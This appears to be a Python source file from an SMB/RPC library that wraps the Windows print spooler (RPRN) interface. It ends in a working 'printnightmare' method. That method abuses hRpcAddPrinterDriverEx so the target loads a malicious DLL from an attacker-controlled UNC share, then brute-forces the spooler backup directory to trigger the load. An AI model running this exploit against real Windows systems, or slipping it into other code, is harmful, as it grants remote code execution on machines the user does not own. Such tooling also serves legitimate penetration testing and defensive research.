import traceback
from aiosmb.dcerpc.v5 import rprn
from aiosmb import logger
from aiosmb.dcerpc.v5.interfaces import InterfaceManager, InterfaceEndpoint

from aiosmb.dcerpc.v5.dtypes import NULL
import pathlib
from aiosmb.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE,\
	RPC_C_AUTHN_LEVEL_CONNECT,\
	RPC_C_AUTHN_LEVEL_CALL,\
	RPC_C_AUTHN_LEVEL_PKT,\
	RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,\
	RPC_C_AUTHN_LEVEL_PKT_PRIVACY,\
	DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE

from contextlib import asynccontextmanager

@asynccontextmanager
async def rprnrpc_from_smb(connection, auth_level=None, open=True, perform_dummy=False):
    instance, err = await RPRNRPC.from_smbconnection(connection, connect=open)
    if err:
        # Handle or raise the error as appropriate
        raise err
    try:
        yield instance
    finally:
        await instance.close()

class RPRNRPC(InterfaceManager):
	def __init__(self, connection, endpoint):
		super().__init__(connection, endpoint)
		
		self.handle_ctr = 0
		self.printer_handles = {}
	
	@classmethod
	def endpoints(cls):
		return [
			InterfaceEndpoint('ncan_np', "12345678-1234-abcd-ef00-0123456789ab", "1.0", pipename=r"\spoolss", authlevel=RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
			InterfaceEndpoint('ncacn_ip_tcp', "12345678-1234-abcd-ef00-0123456789ab", "1.0", authlevel=RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
		]
	
	@staticmethod
	def create_instance(connection, endpoint):
		return RPRNRPC(connection, endpoint)
	
	async def cleanup(cls):
		pass
	
	async def open_printer(self, printerName, pDatatype = NULL, pDevModeContainer = NULL, accessRequired = rprn.SERVER_READ):
		try:
			resp, err = await rprn.hRpcOpenPrinter(self.dce, printerName, pDatatype, pDevModeContainer, accessRequired)
			if err is not None:
				raise err
			handle_no = self.handle_ctr
			self.handle_ctr += 1
			self.printer_handles[handle_no] = resp['pHandle']

			return handle_no, None
		except Exception as e:
			return None, e

	async def hRpcRemoteFindFirstPrinterChangeNotificationEx(self, handle, fdwFlags, fdwOptions=0, pszLocalMachine=NULL, dwPrinterLocal=0, pOptions=NULL):
		try:
			handle = self.printer_handles[handle]
			resp, err = await rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
				self.dce, 
				handle, 
				fdwFlags, 
				fdwOptions=fdwOptions,
				pszLocalMachine=pszLocalMachine,
				dwPrinterLocal=dwPrinterLocal, 
				pOptions=pOptions
			)
			if err is not None:
				raise err

			return resp, None
		except Exception as e:
			return None, e
	
	async def hRpcRemoteFindFirstPrinterChangeNotification(self, handle, fdwFlags, fdwOptions=0, pszLocalMachine=NULL, dwPrinterLocal=0, pOptions=NULL):
		try:
			handle = self.printer_handles[handle]
			resp, err = await rprn.hRpcRemoteFindFirstPrinterChangeNotification(
				self.dce, 
				handle, 
				fdwFlags, 
				fdwOptions=fdwOptions,
				pszLocalMachine=pszLocalMachine,
				dwPrinterLocal=dwPrinterLocal, 
				pOptions=pOptions
			)
			if err is not None:
				raise err

			return resp, None
		except Exception as e:
			return None, e
	
	async def enum_drivers(self, environments, level = 2, name = ''):
		try:
			if environments[-1] != '\x00':
				environments += '\x00'
			drivers, err = await rprn.hRpcEnumPrinterDrivers(self.dce, name, environments, level)
			if err is not None:
				return None, err
			return drivers, None
		except Exception as e:
			return None, e
	
	async def get_driverpath(self, environments = "Windows x64"):
		try:
			drivers, err = await self.enum_drivers(environments, level = 2)
			if err is not None:
				return None, err
			
			for driver in drivers:
				DriverPath = str(pathlib.PureWindowsPath(driver.DriverPath).parent) + '\\UNIDRV.DLL'
				if "FileRepository" in DriverPath:
					return DriverPath, None

			return None, Exception('Failed to obtain driverpath')
		except Exception as e:
			return None, e


	async def printnightmare(self, share, driverpath = None, handle=NULL, environments = "Windows x64", name = "1234", silent = False):
		try:
			# share needs to be in UNC format! (\\\\10.0.0.1\\share\\...)
			if driverpath is None:
				driverpath, err = await self.get_driverpath(environments = environments)
				if err is not None:
					return None, err
			if driverpath[-1] != '\x00':
				driverpath += '\x00'
			if environments[-1] != '\x00':
				environments += '\x00'
			if name[-1] != '\x00':
				name += '\x00'
			if share[-1] != '\x00':
				share += '\x00'

			container_info = rprn.DRIVER_CONTAINER()
			container_info['Level'] = 2
			container_info['DriverInfo']['tag'] = 2
			container_info['DriverInfo']['Level2']['cVersion']     = 3
			container_info['DriverInfo']['Level2']['pName']        = name
			container_info['DriverInfo']['Level2']['pEnvironment'] = environments
			container_info['DriverInfo']['Level2']['pDriverPath']  = driverpath
			container_info['DriverInfo']['Level2']['pDataFile']    = share
			container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"

			flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
			filename = share.split("\\")[-1]

			#### Triggering the download of the evil DLL
			resp, err = await rprn.hRpcAddPrinterDriverEx(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
			if err is not None:
				raise err
			if silent is False:
				print("[*] Stage 0: {0}".format(resp['ErrorCode']))

			#### Triggering a change in the new printer's config which automatically creates a backup of the evil DLL
			container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\kernelbase.dll\x00"
			resp, err = await rprn.hRpcAddPrinterDriverEx(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
			if err is not None:
				raise err
			if silent is False:
				print("[*] Stage 1: {0}".format(resp['ErrorCode']))

			##### Triggering the DLL load of the backup version of evil DLL. We first need to find the correct directory...
			for i in range(1, 30):
				try:
					container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
					resp, err = await rprn.hRpcAddPrinterDriverEx(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
					if err is not None:
						raise err
					if silent is False:
						print("[*] Stage %s: %s" % (i+1, resp['ErrorCode']))
					if (resp['ErrorCode'] == 0):
						if silent is False:
							print("[+] Exploit Completed")
						return True, None
				except Exception as e:
					if silent is False:
						print("[*] Stage %s: %s" % (i+1, e))
					continue

			return False, None
		except Exception as e:
			if silent is False:
				traceback.print_exc()
			return None, e